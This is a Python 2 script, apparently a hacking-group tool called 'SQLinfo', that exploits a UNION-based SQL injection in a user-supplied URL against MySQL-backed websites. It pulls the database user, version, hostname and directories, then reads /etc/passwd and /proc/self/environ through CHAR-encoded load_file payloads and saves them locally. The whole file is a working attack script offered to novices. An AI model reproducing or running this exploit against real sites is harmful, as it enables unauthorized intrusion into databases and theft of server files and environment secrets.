#/url/lib/python
# -*- coding: utf-8 -*-
#
#    Information Gathering with SQL injection 
#
#    Version: 0.1
#    Author : SajjadBnd (Biskoit Pedar =) )
#    Email  : blackwolf@post.com
#    Github : github.com/Blackwolf-Iran
#
#    CssT - IrA Team - priv8_tm
###############################################

import requests 
import re 
import os
import platform
import time
from time import gmtime, strftime
import sys
import bcolors
import sys

reload(sys)
sys.setdefaultencoding("utf-8")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


if platform.system() == "Windows":
 os.system("cls")
 os.system("color a") 
else:
 os.system("clear")
print bcolors.HEADER + " ..::==  This Tool Just For N00Bs like YoU =)  ==::.. " + bcolors.ENDC
time.sleep(0.7)
print bcolors.UNDERLINE + "\n SQLinfo ver 0.1 \n - This Tool is for information gathering from SQL server targets(MySQL)" + bcolors.ENDC
time.sleep(0.3)
print """\t
  _________________  .____    .__        _____       
 /   _____/\_____  \ |    |   |__| _____/ ____\____  
 \_____  \  /  / \  \|    |   |  |/    \   __\/  _ \ 
 /        \/   \_/.  \    |___|  |   |  \  | (  <_> )
/_______  /\_____\ \_/_______ \__|___|  /__|  \____/ 
        \/        \__>       \/       \/             
""" 
print bcolors.WARNING + "\t==========="
time.sleep(0.3)
print "\t----=# Info Gathering with SQLi     "
time.sleep(0.3)
print "\t----=# Version: 0.1"
time.sleep(0.3)
print "\t----=# Author : SajjadBnd (Biskoit Pedar)"
time.sleep(0.3)
print "\t----=# Email  : blackwolf@post.com"
time.sleep(0.3)
print "\t----=# Github : http://github.com/Blackwolf-Iran "
time.sleep(0.3)
print "\t===========" + bcolors.ENDC
time.sleep(0.3)
print bcolors.BOLD + "\n\n  Example Link : http://site.com/news.php?id=-1 union select 1,2,3,4-- -\n\n\n"+ bcolors.ENDC
linku = raw_input("[.] Insert Link > ")
vcal = raw_input("[.] Insert vulnerable column > ")
if vcal == '':
 print bcolors.FAIL + "\n[-] Error \n[-] Vulnerable Column Not Detected !"   
 print "[-] Exiting ... !"  
 time.sleep(1) 
 raise SystemExit
print "\n-----------------[Scan Started]-----------------------"
time.sleep(2)
target = linku.replace(vcal, "Concat(0x53514c696e666f40)")
starttime = strftime("%A %d. %B %Y - %H:%M:%S", gmtime())
print bcolors.OKGREEN +"\n[*] SQLifo Started At > " + "["+starttime+"]" + bcolors.ENDC
time.sleep(1)
localtime = strftime("%H:%M:%S", gmtime())
print bcolors.OKGREEN + "\n[+][" + strftime("%H:%M:%S", gmtime()) + "]" + bcolors.ENDC + " Checking Connection :" ,
time.sleep(1)
r = requests.get(target, timeout=20)
pri = requests.codes.ok
if pri == 200 :
 print bcolors.OKGREEN , r.status_code , "[ok]"+bcolors.ENDC
else:
 print bcolors.FAIL +"[-] Can not connect to the target"+bcolors.ENDC
rf = re.findall('(.*?)SQLinfo@(.*?)', r.text)
if rf == [] :
 print bcolors.FAIL +"[-] Incorrect Vulnerability Column Or Target is not Vulenrable"+bcolors.ENDC
 raise SystemExit
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Username ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,user())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" User/Host Name : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Version ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,version())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Version : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Database Name ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,database())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" DATABASE : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching CONNECTION_ID ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,CONNECTION_ID())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" CONNECTION_ID : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Hostname ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,hostname())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Hostname : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Tmp_Dir ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,tmpdir())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Tmp Dir : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching DataDire ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,datadir())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" data dir : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Base Dir ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,basedir())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Base Dir : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching System UUID Key ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,UUID())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" SYSTEM UUID Key : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching System User ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,system_user())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" SYSTEM User : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Fetching Session User ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,session_user())")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Sesion User : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Check if Symlink Enabled or Disabled ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,@@GLOBAL.have_symlink)")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Symlink : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" Checking SSL ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,@@GLOBAL.have_ssl)")
r = requests.get(target, timeout=20)
rf = re.findall('SQLinfo@(.*?)</', r.text)
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" SSL : ", bcolors.OKBLUE , rf , bcolors.ENDC
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" READING /etc/passwd ..."
target = linku.replace(vcal, "concat(0x53514c696e666f40,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)))")
r = requests.get(target, timeout=20)
file = open('passwd.html', 'w')
file.write(r.text)
file.close()
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" File /etc/passwd :  Saved ! passwd.html - Check it =) "
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" READING /proc/self/environ ..."
target = linku.replace(vcal, "Concat(0x53514c696e666f40,load_file(CHAR(47, 112, 114, 111, 99, 47, 115, 101, 108, 102, 47, 101, 110, 118, 105, 114, 111, 110)))")
r = requests.get(target, timeout=20)
file = open('environ.html', 'w')
file.write(r.text)
file.close()
print bcolors.OKGREEN+"[+][" + strftime("%H:%M:%S", gmtime()) + "]"+bcolors.ENDC +" File proc/self/environ : Saved ! environ.html - Check it =) "
print bcolors.OKBLUE+"\n\n [+] Good Bye !"
print " [+] SQLinfo ["+strftime("%A %d. %B %Y - %H:%M:%S", gmtime())+"]"+"\n\n   Exiting ... !\n"
time.sleep(0.6)
